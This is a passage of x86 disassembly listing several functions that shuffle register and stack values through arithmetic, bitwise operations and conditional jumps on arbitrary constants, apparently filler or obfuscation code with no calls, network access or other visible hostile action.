  41bf9f:	sub    esp,0x2c
  41bfa2:	mov    eax,0x9e
  41bfa7:	mov    edx,0xc6
  41bfac:	mov    DWORD PTR [ebp-0x2c],eax
  41bfaf:	or     DWORD PTR [ebp-0x2c],eax
  41bfb2:	or     DWORD PTR [ebp-0x2c],eax
  41bfb5:	sub    eax,edx
  41bfb7:	and    DWORD PTR [ebp-0x2c],eax
  41bfba:	push   ebx
  41bfbb:	mov    ecx,DWORD PTR [ebp-0x2c]
  41bfbe:	add    ecx,edx
  41bfc0:	mov    ebx,DWORD PTR [ebp-0x2c]
  41bfc3:	xor    DWORD PTR [ebp-0x2c],ebx
  41bfc6:	or     ecx,eax
  41bfc8:	add    ecx,ebx
  41bfca:	add    DWORD PTR [ebp-0x2c],eax
  41bfcd:	sub    ecx,eax
  41bfcf:	sub    ecx,eax
  41bfd1:	mov    DWORD PTR [ebp-0x2c],ecx
  41bfd4:	push   esi
  41bfd5:	add    DWORD PTR [ebp-0x2c],ecx
  41bfd8:	push   edi
  41bfd9:	mov    eax,DWORD PTR [ebp-0x2c]
  41bfdc:	mov    edi,DWORD PTR ds:0x459e74
  41bfe2:	and    DWORD PTR [ebp-0x2c],ecx
  41bfe5:	sub    eax,ebx
  41bfe7:	sub    edi,ebx
  41bfe9:	add    edi,ecx
  41bfeb:	cmp    edi,DWORD PTR [ebp-0x10]
  41bfee:	je     0x41c021
  41bff0:	cmp    eax,DWORD PTR ds:0x459e74
  41bff6:	je     0x41c021
  41bff8:	mov    ebx,0xba
  41bffd:	and    eax,ecx
  41bfff:	mov    esi,edi
  41c001:	mov    DWORD PTR [ebp-0x14],esi
  41c004:	cmp    eax,DWORD PTR [ebp-0x14]
  41c007:	jne    0x41c021
  41c009:	mov    ecx,0xda
  41c00e:	mov    DWORD PTR [ebp-0x14],ecx
  41c011:	sub    ebx,edi
  41c013:	mov    edx,DWORD PTR [ebp-0x14]
  41c016:	sub    DWORD PTR [ebp-0x2c],edx
  41c019:	add    DWORD PTR [ebp-0x14],ebx
  41c01c:	add    eax,eax
  41c01e:	or     DWORD PTR [ebp-0x14],eax
  41c021:	mov    eax,DWORD PTR ds:0x459e74
  41c027:	add    DWORD PTR [ebp-0x2c],eax
  41c02a:	cmp    edx,0xffffffb8
  41c02d:	jne    0x41c032
  41c02f:	xor    DWORD PTR [ebp-0x2c],ebx
  41c032:	mov    edx,DWORD PTR ds:0x459e74
  41c038:	mov    eax,DWORD PTR [ebp-0x2c]
  41c03b:	sub    edx,ebx
  41c03d:	mov    DWORD PTR [ebp-0x2c],edx
  41c040:	add    DWORD PTR [ebp-0x2c],ecx
  41c043:	add    DWORD PTR [ebp-0x2c],eax
  41c046:	and    ecx,edi
  41c048:	mov    edi,DWORD PTR [ebp-0x2c]
  41c04b:	add    DWORD PTR [ebp-0x2c],eax
  41c04e:	sub    DWORD PTR [ebp-0x2c],edi
  41c051:	cmp    eax,0x54
  41c054:	je     0x41c0ab
  41c056:	test   ebx,0xf720
  41c05c:	je     0x41c0ab
  41c05e:	mov    eax,DWORD PTR [ebp-0x2c]
  41c061:	add    DWORD PTR [ebp-0x2c],ecx
  41c064:	cmp    edx,DWORD PTR [ebp-0x28]
  41c067:	jne    0x41c0ab
  41c069:	test   ecx,0x37
  41c06f:	jne    0x41c0ab
  41c071:	cmp    esi,DWORD PTR ds:0x459e74
  41c077:	je     0x41c0ab
  41c079:	mov    ebx,DWORD PTR [ebp-0x2c]
  41c07c:	mov    esi,0xdd71
  41c081:	add    ebx,edi
  41c083:	add    DWORD PTR [ebp-0x2c],ebx
  41c086:	sub    esi,eax
  41c088:	cmp    esi,ecx
  41c08a:	je     0x41c0ab
  41c08c:	add    DWORD PTR [ebp-0x2c],ecx
  41c08f:	mov    ebx,ecx
  41c091:	mov    edi,DWORD PTR [ebp-0x2c]
  41c094:	add    DWORD PTR [ebp-0x2c],esi
  41c097:	cmp    ebx,0xef91
  41c09d:	jne    0x41c0ab
  41c09f:	or     DWORD PTR [ebp-0x2c],edi
  41c0a2:	add    ebx,esi
  41c0a4:	cmp    edi,esi
  41c0a6:	jne    0x41c0ab
  41c0a8:	add    DWORD PTR [ebp-0x2c],ebx
  41c0ab:	add    ecx,ecx
  41c0ad:	mov    edx,0xd7
  41c0b2:	mov    ebx,0xd1
  41c0b7:	or     edx,eax
  41c0b9:	sub    ebx,eax
  41c0bb:	cmp    edx,esi
  41c0bd:	jne    0x41c155
  41c0c3:	xor    DWORD PTR [ebp-0x2c],ecx
  41c0c6:	mov    edi,0xb1
  41c0cb:	sub    edi,ecx
  41c0cd:	sub    DWORD PTR [ebp-0x2c],edx
  41c0d0:	mov    eax,DWORD PTR ds:0x459e74
  41c0d6:	sub    ebx,esi
  41c0d8:	or     edi,ecx
  41c0da:	or     DWORD PTR [ebp-0x2c],edi
  41c0dd:	cmp    ebx,edi
  41c0df:	jne    0x41c155
  41c0e1:	mov    edi,DWORD PTR [ebp-0x2c]
  41c0e4:	mov    esi,DWORD PTR [ebp-0x2c]
  41c0e7:	test   edi,0x4f0b
  41c0ed:	jne    0x41c155
  41c0ef:	add    eax,esi
  41c0f1:	add    DWORD PTR [ebp-0x2c],esi
  41c0f4:	xor    DWORD PTR [ebp-0x2c],edi
  41c0f7:	cmp    ebx,eax
  41c0f9:	jne    0x41c155
  41c0fb:	mov    edx,DWORD PTR [ebp-0x2c]
  41c0fe:	cmp    eax,0xffffffe9
  41c101:	jne    0x41c155
  41c103:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c106:	cmp    edx,0x71
  41c109:	je     0x41c155
  41c10b:	mov    esi,0x39
  41c110:	mov    edi,DWORD PTR [ebp-0x2c]
  41c113:	add    DWORD PTR [ebp-0x2c],edx
  41c116:	add    DWORD PTR [ebp-0x2c],esi
  41c119:	sub    ecx,edx
  41c11b:	add    DWORD PTR [ebp-0x2c],ecx
  41c11e:	sub    DWORD PTR [ebp-0x2c],edi
  41c121:	cmp    ebx,esi
  41c123:	je     0x41c155
  41c125:	mov    edi,0xbf4d
  41c12a:	add    ebx,ecx
  41c12c:	sub    DWORD PTR [ebp-0x2c],ebx
  41c12f:	xor    DWORD PTR [ebp-0x2c],eax
  41c132:	mov    esi,DWORD PTR [ebp-0x2c]
  41c135:	cmp    esi,edx
  41c137:	jne    0x41c155
  41c139:	mov    eax,DWORD PTR [ebp-0x2c]
  41c13c:	sub    esi,edx
  41c13e:	sub    DWORD PTR [ebp-0x2c],edi
  41c141:	sub    DWORD PTR [ebp-0x2c],eax
  41c144:	mov    ebx,DWORD PTR [ebp-0x2c]
  41c147:	cmp    eax,edi
  41c149:	je     0x41c155
  41c14b:	add    esi,edi
  41c14d:	sub    DWORD PTR [ebp-0x2c],esi
  41c150:	and    ebx,ecx
  41c152:	sub    DWORD PTR [ebp-0x2c],ebx
  41c155:	pop    edi
  41c156:	mov    eax,0xa6
  41c15b:	mov    edx,DWORD PTR [ebp-0x2c]
  41c15e:	mov    DWORD PTR [ebp-0x2c],edi
  41c161:	cmp    ecx,DWORD PTR [ebp-0x10]
  41c164:	je     0x41c193
  41c166:	mov    esi,0xe74
  41c16b:	mov    ecx,0xfc
  41c170:	and    DWORD PTR [ebp-0x2c],esi
  41c173:	add    eax,ecx
  41c175:	add    DWORD PTR [ebp-0x2c],edx
  41c178:	add    eax,edx
  41c17a:	add    eax,ebx
  41c17c:	cmp    eax,0x28
  41c17f:	je     0x41c193
  41c181:	cmp    eax,0x15
  41c184:	je     0x41c193
  41c186:	sub    eax,edi
  41c188:	cmp    eax,DWORD PTR ds:0x459e74
  41c18e:	jne    0x41c193
  41c190:	add    DWORD PTR [ebp-0x2c],eax
  41c193:	pop    esi
  41c194:	mov    ecx,DWORD PTR [ebp-0x2c]
  41c197:	mov    ebx,DWORD PTR ds:0x459e74
  41c19d:	sub    DWORD PTR [ebp-0x2c],ebx
  41c1a0:	add    DWORD PTR [ebp-0x2c],ecx
  41c1a3:	pop    ebx
  41c1a4:	mov    edx,0xef71
  41c1a9:	and    edx,edi
  41c1ab:	sub    DWORD PTR [ebp-0x2c],esi
  41c1ae:	and    DWORD PTR [ebp-0x2c],edx
  41c1b1:	leave  
  41c1b2:	ret    
  41c1b3:	int3   
  41c1b4:	int3   
  41c1b5:	int3   
  41c1b6:	int3   
  41c1b7:	int3   
  41c1b8:	push   ebp
  41c1b9:	mov    ebp,esp
  41c1bb:	sub    esp,0x20
  41c1be:	mov    edx,0x28
  41c1c3:	mov    eax,edx
  41c1c5:	add    edx,eax
  41c1c7:	and    eax,edx
  41c1c9:	and    edx,eax
  41c1cb:	mov    DWORD PTR [ebp-0xc],eax
  41c1ce:	sub    edx,eax
  41c1d0:	add    DWORD PTR [ebp-0xc],edx
  41c1d3:	push   ebx
  41c1d4:	add    edx,edx
  41c1d6:	and    DWORD PTR [ebp-0xc],eax
  41c1d9:	mov    ecx,DWORD PTR [ebp-0xc]
  41c1dc:	add    DWORD PTR [ebp-0xc],ecx
  41c1df:	mov    ecx,edx
  41c1e1:	sub    DWORD PTR [ebp-0xc],ecx
  41c1e4:	push   esi
  41c1e5:	mov    esi,0x9d
  41c1ea:	mov    ebx,DWORD PTR [ebp-0xc]
  41c1ed:	add    ebx,ebx
  41c1ef:	test   ebx,0x12
  41c1f5:	jne    0x41c29b
  41c1fb:	mov    ecx,ebx
  41c1fd:	add    DWORD PTR [ebp-0xc],esi
  41c200:	mov    edx,DWORD PTR [ebp-0xc]
  41c203:	cmp    edx,0x766d
  41c209:	je     0x41c29b
  41c20f:	cmp    ecx,eax
  41c211:	je     0x41c29b
  41c217:	mov    eax,DWORD PTR [ebp-0xc]
  41c21a:	cmp    ecx,DWORD PTR [ebp-0x8]
  41c21d:	je     0x41c29b
  41c21f:	cmp    eax,ecx
  41c221:	je     0x41c29b
  41c223:	cmp    ecx,0x42
  41c226:	je     0x41c29b
  41c228:	add    DWORD PTR [ebp-0xc],ecx
  41c22b:	sub    DWORD PTR [ebp-0xc],eax
  41c22e:	cmp    edx,esi
  41c230:	jne    0x41c29b
  41c232:	mov    esi,DWORD PTR [ebp-0xc]
  41c235:	sub    DWORD PTR [ebp-0xc],esi
  41c238:	add    edx,edx
  41c23a:	mov    ecx,0x0
  41c23f:	test   edx,0x70
  41c245:	jne    0x41c29b
  41c247:	sub    DWORD PTR [ebp-0xc],ecx
  41c24a:	add    edx,ecx
  41c24c:	add    edx,ecx
  41c24e:	mov    esi,ecx
  41c250:	mov    ebx,0x93
  41c255:	sub    edx,ecx
  41c257:	sub    edx,eax
  41c259:	cmp    eax,DWORD PTR [ebp-0x14]
  41c25c:	je     0x41c29b
  41c25e:	mov    ecx,DWORD PTR [ebp-0xc]
  41c261:	mov    eax,DWORD PTR [ebp-0xc]
  41c264:	and    ecx,esi
  41c266:	cmp    ecx,0x44
  41c269:	jne    0x41c29b
  41c26b:	sub    DWORD PTR [ebp-0xc],esi
  41c26e:	cmp    eax,DWORD PTR [ebp-0x8]
  41c271:	jne    0x41c29b
  41c273:	cmp    edx,0xfffffff7
  41c276:	je     0x41c29b
  41c278:	add    edx,ecx
  41c27a:	or     edx,ebx
  41c27c:	mov    esi,0x97
  41c281:	xor    DWORD PTR [ebp-0xc],edx
  41c284:	mov    ecx,DWORD PTR [ebp-0xc]
  41c287:	add    DWORD PTR [ebp-0xc],esi
  41c28a:	or     DWORD PTR [ebp-0xc],eax
  41c28d:	cmp    ecx,DWORD PTR [ebp-0x10]
  41c290:	jne    0x41c29b
  41c292:	mov    ebx,DWORD PTR [ebp-0xc]
  41c295:	sub    DWORD PTR [ebp-0xc],ecx
  41c298:	sub    DWORD PTR [ebp-0xc],ebx
  41c29b:	push   edi
  41c29c:	mov    ebx,0xcf
  41c2a1:	mov    edi,0x3d
  41c2a6:	add    ebx,esi
  41c2a8:	sub    edi,edx
  41c2aa:	and    edi,eax
  41c2ac:	sub    DWORD PTR [ebp-0xc],edx
  41c2af:	sub    edi,ebx
  41c2b1:	sub    edi,esi
  41c2b3:	cmp    edi,DWORD PTR [ebp-0x1c]
  41c2b6:	je     0x41c2fd
  41c2b8:	mov    edx,ecx
  41c2ba:	cmp    edx,ebx
  41c2bc:	je     0x41c2fd
  41c2be:	cmp    edi,DWORD PTR [ebp-0x14]
  41c2c1:	je     0x41c2fd
  41c2c3:	mov    ecx,0xd1db
  41c2c8:	mov    esi,DWORD PTR [ebp-0xc]
  41c2cb:	add    ecx,edi
  41c2cd:	cmp    esi,0xfffffff4
  41c2d0:	jne    0x41c2fd
  41c2d2:	mov    edi,edx
  41c2d4:	cmp    esi,0xffffffca
  41c2d7:	je     0x41c2fd
  41c2d9:	cmp    edi,0xffffffa3
  41c2dc:	jne    0x41c2fd
  41c2de:	mov    eax,DWORD PTR [ebp-0xc]
  41c2e1:	sub    edi,eax
  41c2e3:	mov    eax,esi
  41c2e5:	cmp    eax,DWORD PTR [ebp-0xc]
  41c2e8:	jne    0x41c2fd
  41c2ea:	cmp    eax,DWORD PTR [ebp-0x10]
  41c2ed:	je     0x41c2fd
  41c2ef:	or     DWORD PTR [ebp-0xc],ecx
  41c2f2:	and    edi,esi
  41c2f4:	xor    DWORD PTR [ebp-0xc],eax
  41c2f7:	add    DWORD PTR [ebp-0xc],ecx
  41c2fa:	xor    DWORD PTR [ebp-0xc],edi
  41c2fd:	mov    edi,DWORD PTR [ebp-0xc]
  41c300:	or     edi,ecx
  41c302:	cmp    edi,ecx
  41c304:	jne    0x41c335
  41c306:	add    edi,ebx
  41c308:	add    edi,ebx
  41c30a:	mov    eax,DWORD PTR [ebp-0xc]
  41c30d:	mov    ebx,DWORD PTR [ebp-0xc]
  41c310:	and    DWORD PTR [ebp-0xc],eax
  41c313:	cmp    edi,0x53
  41c316:	je     0x41c335
  41c318:	xor    DWORD PTR [ebp-0xc],eax
  41c31b:	cmp    edi,DWORD PTR [ebp-0x4]
  41c31e:	jne    0x41c335
  41c320:	mov    esi,0x1838000
  41c325:	or     DWORD PTR [ebp-0xc],ebx
  41c328:	test   edi,0x0
  41c32e:	je     0x41c335
  41c330:	or     edi,esi
  41c332:	and    DWORD PTR [ebp-0xc],edi
  41c335:	cmp    eax,edx
  41c337:	jne    0x41c36e
  41c339:	mov    edi,DWORD PTR [ebp-0xc]
  41c33c:	and    edi,edx
  41c33e:	mov    ebx,0xc0
  41c343:	add    ebx,eax
  41c345:	add    edi,edx
  41c347:	cmp    ebx,esi
  41c349:	jne    0x41c36e
  41c34b:	sub    DWORD PTR [ebp-0xc],edi
  41c34e:	add    ebx,ecx
  41c350:	cmp    ebx,DWORD PTR [ebp-0x8]
  41c353:	je     0x41c36e
  41c355:	sub    ebx,ecx
  41c357:	add    ebx,esi
  41c359:	mov    edi,DWORD PTR [ebp-0xc]
  41c35c:	mov    DWORD PTR [ebp-0xc],edi
  41c35f:	cmp    ebx,0x12
  41c362:	jne    0x41c36e
  41c364:	cmp    ebx,DWORD PTR [ebp-0x8]
  41c367:	jne    0x41c36e
  41c369:	sub    ebx,eax
  41c36b:	and    DWORD PTR [ebp-0xc],ebx
  41c36e:	add    edx,ecx
  41c370:	mov    esi,DWORD PTR [ebp-0xc]
  41c373:	add    edx,ebx
  41c375:	sub    DWORD PTR [ebp-0xc],esi
  41c378:	sub    edx,eax
  41c37a:	cmp    edx,0x28
  41c37d:	je     0x41c3fb
  41c37f:	cmp    eax,0x8654
  41c384:	je     0x41c3fb
  41c386:	add    DWORD PTR [ebp-0xc],ecx
  41c389:	mov    esi,DWORD PTR [ebp-0xc]
  41c38c:	or     esi,edi
  41c38e:	add    DWORD PTR [ebp-0xc],esi
  41c391:	mov    eax,DWORD PTR [ebp-0xc]
  41c394:	cmp    edx,0x17
  41c397:	je     0x41c3fb
  41c399:	test   edx,0x50
  41c39f:	jne    0x41c3fb
  41c3a1:	xor    DWORD PTR [ebp-0xc],esi
  41c3a4:	mov    ecx,DWORD PTR [ebp-0xc]
  41c3a7:	sub    eax,esi
  41c3a9:	mov    ebx,0x43280404
  41c3ae:	sub    DWORD PTR [ebp-0xc],ebx
  41c3b1:	cmp    eax,edi
  41c3b3:	jne    0x41c3fb
  41c3b5:	mov    ebx,0x93f5
  41c3ba:	sub    DWORD PTR [ebp-0xc],ebx
  41c3bd:	mov    edi,0x1
  41c3c2:	mov    DWORD PTR [ebp-0xc],ecx
  41c3c5:	mov    DWORD PTR [ebp-0xc],edx
  41c3c8:	sub    edi,edx
  41c3ca:	cmp    ecx,0x22f7
  41c3d0:	jne    0x41c3fb
  41c3d2:	sub    eax,esi
  41c3d4:	cmp    eax,0xffffff9e
  41c3d7:	jne    0x41c3fb
  41c3d9:	and    DWORD PTR [ebp-0xc],eax
  41c3dc:	or     edi,eax
  41c3de:	add    edi,edi
  41c3e0:	sub    edi,ecx
  41c3e2:	add    edi,edx
  41c3e4:	mov    edx,DWORD PTR [ebp-0xc]
  41c3e7:	mov    DWORD PTR [ebp-0xc],ecx
  41c3ea:	mov    eax,DWORD PTR [ebp-0xc]
  41c3ed:	or     DWORD PTR [ebp-0xc],ecx
  41c3f0:	add    DWORD PTR [ebp-0xc],edi
  41c3f3:	or     DWORD PTR [ebp-0xc],edx
  41c3f6:	sub    eax,edi
  41c3f8:	add    DWORD PTR [ebp-0xc],eax
  41c3fb:	cmp    edi,DWORD PTR [ebp-0x8]
  41c3fe:	jne    0x41c411
  41c400:	mov    edi,edx
  41c402:	cmp    edi,DWORD PTR [ebp-0x14]
  41c405:	jne    0x41c411
  41c407:	sub    edi,ecx
  41c409:	mov    edx,DWORD PTR [ebp-0xc]
  41c40c:	add    edx,edi
  41c40e:	xor    DWORD PTR [ebp-0xc],edx
  41c411:	pop    edi
  41c412:	mov    esi,DWORD PTR [ebp-0xc]
  41c415:	mov    ebx,0x2c
  41c41a:	add    DWORD PTR [ebp-0xc],ebx
  41c41d:	or     DWORD PTR [ebp-0xc],edi
  41c420:	add    esi,edx
  41c422:	sub    esi,ebx
  41c424:	add    DWORD PTR [ebp-0xc],esi
  41c427:	pop    esi
  41c428:	add    DWORD PTR [ebp-0xc],edi
  41c42b:	pop    ebx
  41c42c:	mov    edx,0xe6e2
  41c431:	cmp    ebx,0x3
  41c434:	jne    0x41c54a
  41c43a:	add    edx,edi
  41c43c:	sub    edx,ecx
  41c43e:	mov    ecx,0x4e
  41c443:	cmp    esi,0x45
  41c446:	jne    0x41c54a
  41c44c:	mov    eax,DWORD PTR [ebp-0xc]
  41c44f:	cmp    ebx,DWORD PTR [ebp-0x8]
  41c452:	je     0x41c54a
  41c458:	add    eax,eax
  41c45a:	and    edx,ebx
  41c45c:	or     ecx,edi
  41c45e:	add    DWORD PTR [ebp-0xc],edx
  41c461:	mov    edx,DWORD PTR ds:0x459e70
  41c467:	sub    edx,eax
  41c469:	add    DWORD PTR [ebp-0xc],edx
  41c46c:	sub    ecx,edx
  41c46e:	sub    ecx,edx
  41c470:	or     ecx,eax
  41c472:	cmp    esi,DWORD PTR ds:0x459e70
  41c478:	jne    0x41c54a
  41c47e:	add    ecx,eax
  41c480:	mov    eax,DWORD PTR [ebp-0xc]
  41c483:	cmp    eax,ebx
  41c485:	jne    0x41c54a
  41c48b:	cmp    eax,0xffffffcc
  41c48e:	je     0x41c54a
  41c494:	test   esi,0x7a
  41c49a:	jne    0x41c54a
  41c4a0:	mov    edx,DWORD PTR ds:0x459e70
  41c4a6:	or     DWORD PTR [ebp-0xc],ebx
  41c4a9:	cmp    esi,0xf0e3
  41c4af:	je     0x41c54a
  41c4b5:	mov    edx,esi
  41c4b7:	cmp    edx,DWORD PTR ds:0x459e70
  41c4bd:	jne    0x41c54a
  41c4c3:	cmp    eax,DWORD PTR ds:0x459e70
  41c4c9:	je     0x41c54a
  41c4cb:	and    eax,ebx
  41c4cd:	or     DWORD PTR [ebp-0xc],ecx
  41c4d0:	mov    ecx,DWORD PTR ds:0x459e70
  41c4d6:	sub    eax,edx
  41c4d8:	or     DWORD PTR [ebp-0xc],eax
  41c4db:	add    DWORD PTR [ebp-0xc],edi
  41c4de:	add    edx,edx
  41c4e0:	and    ecx,edi
  41c4e2:	cmp    edx,ebx
  41c4e4:	jne    0x41c54a
  41c4e6:	cmp    ecx,ebx
  41c4e8:	je     0x41c54a
  41c4ea:	mov    eax,DWORD PTR [ebp-0xc]
  41c4ed:	cmp    ecx,edx
  41c4ef:	je     0x41c54a
  41c4f1:	or     DWORD PTR [ebp-0xc],eax
  41c4f4:	test   edx,0x9fc0
  41c4fa:	je     0x41c54a
  41c4fc:	cmp    ecx,0x3c7a
  41c502:	jne    0x41c54a
  41c504:	sub    DWORD PTR [ebp-0xc],edx
  41c507:	mov    eax,DWORD PTR [ebp-0xc]
  41c50a:	cmp    eax,DWORD PTR [ebp-0xc]
  41c50d:	jne    0x41c54a
  41c50f:	sub    DWORD PTR [ebp-0xc],eax
  41c512:	mov    edx,DWORD PTR [ebp-0xc]
  41c515:	cmp    ecx,DWORD PTR ds:0x459e70
  41c51b:	jne    0x41c54a
  41c51d:	cmp    ecx,0xfdc8
  41c523:	jne    0x41c54a
  41c525:	add    edx,ecx
  41c527:	mov    DWORD PTR [ebp-0x20],eax
  41c52a:	sub    edx,ebx
  41c52c:	mov    eax,DWORD PTR ds:0x459ea4
  41c532:	mov    ecx,DWORD PTR [ebp-0x20]
  41c535:	add    ecx,edx
  41c537:	and    DWORD PTR [ebp-0x20],ecx
  41c53a:	sub    DWORD PTR [ebp-0x20],edx
  41c53d:	xor    DWORD PTR [ebp-0x20],ebx
  41c540:	add    eax,edx
  41c542:	cmp    eax,DWORD PTR [ebp-0x10]
  41c545:	je     0x41c54a
  41c547:	add    DWORD PTR [ebp-0xc],eax
  41c54a:	leave  
  41c54b:	ret    
  41c54c:	int3   
  41c54d:	int3   
  41c54e:	int3   
  41c54f:	int3   
  41c550:	int3   
  41c551:	push   ebp
  41c552:	mov    ebp,esp
  41c554:	sub    esp,0x38
  41c557:	mov    edx,0xa
  41c55c:	mov    DWORD PTR [ebp-0x24],edx
  41c55f:	push   ebx
  41c560:	mov    ecx,DWORD PTR [ebp-0x24]
  41c563:	add    DWORD PTR [ebp-0x24],edx
  41c566:	cmp    ecx,0x1b
  41c569:	je     0x41c56e
  41c56b:	add    DWORD PTR [ebp-0x24],ecx
  41c56e:	push   esi
  41c56f:	test   ecx,0x2a
  41c575:	je     0x41c57a
  41c577:	add    DWORD PTR [ebp-0x24],ecx
  41c57a:	push   edi
  41c57b:	sub    DWORD PTR [ebp-0x24],ecx
  41c57e:	add    ecx,edx
  41c580:	cmp    ecx,edx
  41c582:	je     0x41c5dd
  41c584:	mov    edi,DWORD PTR [ebp-0x24]
  41c587:	mov    edx,DWORD PTR [ebp-0x24]
  41c58a:	cmp    ecx,edx
  41c58c:	je     0x41c5dd
  41c58e:	cmp    edi,0x1e0040c
  41c594:	jne    0x41c5dd
  41c596:	or     DWORD PTR [ebp-0x24],edx
  41c599:	mov    edx,ecx
  41c59b:	mov    ebx,0x5c
  41c5a0:	mov    DWORD PTR [ebp-0x24],ecx
  41c5a3:	mov    DWORD PTR [ebp-0x24],edx
  41c5a6:	or     DWORD PTR [ebp-0x24],edi
  41c5a9:	cmp    edx,0x52
  41c5ac:	je     0x41c5dd
  41c5ae:	sub    ecx,edx
  41c5b0:	add    DWORD PTR [ebp-0x24],ecx
  41c5b3:	add    ebx,ebx
  41c5b5:	mov    ecx,DWORD PTR [ebp-0x24]
  41c5b8:	add    DWORD PTR [ebp-0x24],ebx
  41c5bb:	mov    eax,DWORD PTR [ebp-0x24]
  41c5be:	cmp    eax,0xfffffff8
  41c5c1:	jne    0x41c5dd
  41c5c3:	or     ecx,eax
  41c5c5:	mov    edx,0x63f3
  41c5ca:	add    DWORD PTR [ebp-0x24],ecx
  41c5cd:	mov    edi,DWORD PTR [ebp-0x24]
  41c5d0:	and    edx,ecx
  41c5d2:	and    edx,edi
  41c5d4:	cmp    edx,ebx
  41c5d6:	je     0x41c5dd
  41c5d8:	add    edx,ecx
  41c5da:	sub    DWORD PTR [ebp-0x24],edx
  41c5dd:	cmp    ecx,0xfffffffc
  41c5e0:	jne    0x41c5fa
  41c5e2:	add    edi,edx
  41c5e4:	add    edi,edi
  41c5e6:	mov    ecx,0x18
  41c5eb:	add    DWORD PTR [ebp-0x24],edi
  41c5ee:	mov    esi,DWORD PTR [ebp-0x24]
  41c5f1:	add    DWORD PTR [ebp-0x24],esi
  41c5f4:	sub    DWORD PTR [ebp-0x24],ebx
  41c5f7:	or     DWORD PTR [ebp-0x24],ecx
  41c5fa:	add    DWORD PTR [ebp-0x24],ebx
  41c5fd:	cmp    edx,DWORD PTR [ebp-0x10]
  41c600:	je     0x41c60a
  41c602:	mov    esi,DWORD PTR [ebp-0x24]
  41c605:	add    esi,eax
  41c607:	or     DWORD PTR [ebp-0x24],esi
  41c60a:	mov    ebx,0x9e5
  41c60f:	cmp    edx,0x3f
  41c612:	je     0x41c67e
  41c614:	sub    DWORD PTR [ebp-0x24],esi
  41c617:	mov    ecx,0x44
  41c61c:	cmp    eax,DWORD PTR [ebp-0x14]
  41c61f:	je     0x41c67e
  41c621:	mov    eax,DWORD PTR [ebp-0x24]
  41c624:	cmp    eax,0xcff8
  41c629:	je     0x41c67e
  41c62b:	sub    eax,ebx
  41c62d:	add    DWORD PTR [ebp-0x24],eax
  41c630:	mov    esi,DWORD PTR [ebp-0x24]
  41c633:	mov    edx,DWORD PTR [ebp-0x24]
  41c636:	test   edx,0xe
  41c63c:	jne    0x41c67e
  41c63e:	mov    eax,DWORD PTR [ebp-0x24]
  41c641:	cmp    eax,0xffffffc2
  41c644:	jne    0x41c67e
  41c646:	cmp    esi,edi
  41c648:	je     0x41c67e
  41c64a:	add    ecx,eax
  41c64c:	and    DWORD PTR [ebp-0x24],esi
  41c64f:	add    DWORD PTR [ebp-0x24],ecx
  41c652:	mov    edi,DWORD PTR [ebp-0x24]
  41c655:	sub    edi,eax
  41c657:	cmp    edi,DWORD PTR [ebp-0xc]
  41c65a:	jne    0x41c67e
  41c65c:	cmp    esi,DWORD PTR [ebp-0x28]
  41c65f:	jne    0x41c67e
  41c661:	mov    esi,DWORD PTR ds:0x459e90
  41c667:	or     edi,eax
  41c669:	add    DWORD PTR [ebp-0x24],edi
  41c66c:	and    edx,esi
  41c66e:	mov    eax,DWORD PTR [ebp-0x24]
  41c671:	add    eax,ecx
  41c673:	add    DWORD PTR [ebp-0x24],edx
  41c676:	add    DWORD PTR [ebp-0x24],edi
  41c679:	add    eax,ebx
  41c67b:	sub    DWORD PTR [ebp-0x24],eax
  41c67e:	pop    edi
  41c67f:	mov    ebx,edx
  41c681:	test   edi,0x37
  41c687:	jne    0x41c746
  41c68d:	sub    DWORD PTR [ebp-0x24],edi
  41c690:	cmp    ebx,0x73
  41c693:	je     0x41c746
  41c699:	mov    edx,DWORD PTR [ebp-0x24]
  41c69c:	mov    eax,DWORD PTR ds:0x459e90
  41c6a2:	cmp    edx,DWORD PTR [ebp-0x28]
  41c6a5:	je     0x41c746
  41c6ab:	add    DWORD PTR [ebp-0x24],edx
  41c6ae:	cmp    ebx,0x4342492a
  41c6b4:	je     0x41c746
  41c6ba:	mov    edx,DWORD PTR [ebp-0x24]
  41c6bd:	mov    ecx,DWORD PTR ds:0x459eb8
  41c6c3:	sub    eax,edi
  41c6c5:	cmp    eax,DWORD PTR [ebp-0x18]
  41c6c8:	jne    0x41c746
  41c6ca:	and    DWORD PTR [ebp-0x24],ebx
  41c6cd:	and    DWORD PTR [ebp-0x24],ebx
  41c6d0:	test   edx,0x39
  41c6d6:	jne    0x41c746
  41c6d8:	cmp    edx,0x11d36484
  41c6de:	je     0x41c746
  41c6e0:	cmp    eax,DWORD PTR ds:0x459eb8
  41c6e6:	je     0x41c746
  41c6e8:	sub    DWORD PTR [ebp-0x24],edx
  41c6eb:	or     eax,esi
  41c6ed:	sub    DWORD PTR [ebp-0x24],eax
  41c6f0:	mov    ebx,DWORD PTR ds:0x459e94
  41c6f6:	test   eax,0x4d
  41c6fb:	jne    0x41c746
  41c6fd:	or     ebx,esi
  41c6ff:	and    DWORD PTR [ebp-0x24],eax
  41c702:	mov    esi,DWORD PTR ds:0x459e94
  41c708:	and    ecx,ebx
  41c70a:	mov    ebx,DWORD PTR [ebp-0x24]
  41c70d:	sub    DWORD PTR [ebp-0x24],ecx
  41c710:	sub    DWORD PTR [ebp-0x24],ebx
  41c713:	and    esi,edx
  41c715:	and    esi,ebx
  41c717:	cmp    esi,DWORD PTR ds:0x459eb8
  41c71d:	jne    0x41c746
  41c71f:	mov    eax,DWORD PTR [ebp-0x24]
  41c722:	mov    ebx,0x9d
  41c727:	mov    DWORD PTR [ebp-0x24],eax
  41c72a:	xor    DWORD PTR [ebp-0x24],esi
  41c72d:	add    ebx,eax
  41c72f:	cmp    ebx,DWORD PTR [ebp-0x2c]
  41c732:	je     0x41c746
  41c734:	mov    eax,0x28
  41c739:	mov    eax,0x11
  41c73e:	add    DWORD PTR [ebp-0x24],ebx
  41c741:	and    ecx,eax
  41c743:	and    DWORD PTR [ebp-0x24],ecx
  41c746:	pop    esi
  41c747:	add    ecx,esi
  41c749:	mov    eax,DWORD PTR [ebp-0x24]
  41c74c:	sub    DWORD PTR [ebp-0x24],ecx
  41c74f:	sub    DWORD PTR [ebp-0x24],eax
  41c752:	pop    ebx
  41c753:	add    ecx,edi
  41c755:	add    ecx,edi
  41c757:	sub    ecx,esi
  41c759:	test   ecx,0x31389517
  41c75f:	je     0x41c783
  41c761:	sub    ecx,edx
  41c763:	mov    edx,eax
  41c765:	sub    edx,eax
  41c767:	add    ecx,eax
  41c769:	cmp    ebx,0xffffff8c
  41c76c:	je     0x41c783
  41c76e:	mov    eax,0x62f0
  41c773:	cmp    edx,0x12
